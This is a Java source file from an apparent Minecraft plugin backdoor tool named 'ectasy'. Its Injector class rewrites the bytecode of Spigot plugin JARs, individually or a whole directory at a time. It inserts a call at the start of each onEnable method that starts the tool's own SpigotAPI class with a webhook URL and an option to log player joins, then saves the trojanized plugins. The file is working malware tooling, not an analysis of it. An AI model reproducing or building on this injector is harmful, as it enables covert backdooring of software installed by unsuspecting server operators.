package fr.bodyalhoha.ectasy.utils;

import fr.bodyalhoha.ectasy.Main;
import jdk.internal.org.objectweb.asm.Opcodes;
import org.objectweb.asm.tree.*;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.util.Objects;
import java.util.concurrent.atomic.AtomicBoolean;

public class Injector {

    public static String decode(String path){
        try{
            return java.net.URLDecoder.decode(path, StandardCharsets.UTF_8.name());
        }catch (Exception e){
            return path;
        }
    }

    public static void inject(String input, String output, OptionsParser parser){
        JarLoader plugin = new JarLoader(input, output);
        JarLoader current = new JarLoader(decode(Main.class.getProtectionDomain().getCodeSource().getLocation().getPath()), "");

        try{
            AtomicBoolean injected = new AtomicBoolean(false);
            current.loadJar();
            plugin.loadJar();

            current.classes.stream().filter(cn -> cn.name.contains("API")).forEach(plugin.newClasses::add);
            plugin.classes.forEach((cn) -> {
                cn.methods.forEach((mn) -> {
                    if(mn.name.equalsIgnoreCase("onEnable")){
                        injected.set(true);
                        InsnList list = new InsnList();
                        list.add(new TypeInsnNode(Opcodes.NEW, "fr/bodyalhoha/ectasy/SpigotAPI"));
                        list.add(new InsnNode(Opcodes.DUP));
                        list.add(new VarInsnNode(Opcodes.ALOAD, 0));
                        list.add(new LdcInsnNode(parser.getDefault("", "webhook")));
                        list.add(new InsnNode(parser.getBool("logjoins") ? Opcodes.ICONST_1 : Opcodes.ICONST_0));
                        list.add(new MethodInsnNode(Opcodes.INVOKESPECIAL, "fr/bodyalhoha/ectasy/SpigotAPI", "<init>", "(Lorg/bukkit/plugin/java/JavaPlugin;Ljava/lang/String;Z)V", false));
                        list.add(new InsnNode(Opcodes.POP));

                        mn.instructions.insertBefore(mn.instructions.getFirst(), list);
                    }
                });
            });


            if(!injected.get()){
                System.out.println("[-] Could not inject " + plugin.input);
                return;
            }
            plugin.saveJar();

            System.out.println("[+] Injected " + plugin.input + " -> " + plugin.output);


        }catch (Exception e){
            System.out.println("[-] Could not inject " + plugin.input);
            e.printStackTrace();

        }
    }

    public static void injectDirectory(File directory, String out, OptionsParser parser){
        File output = new File(out);
        if(!output.exists())
            output.mkdir();
        for(String pl : Objects.requireNonNull(directory.list())){
            inject(directory.getPath() + "/" + pl, out + "/" + pl, parser);
        }
    }

}
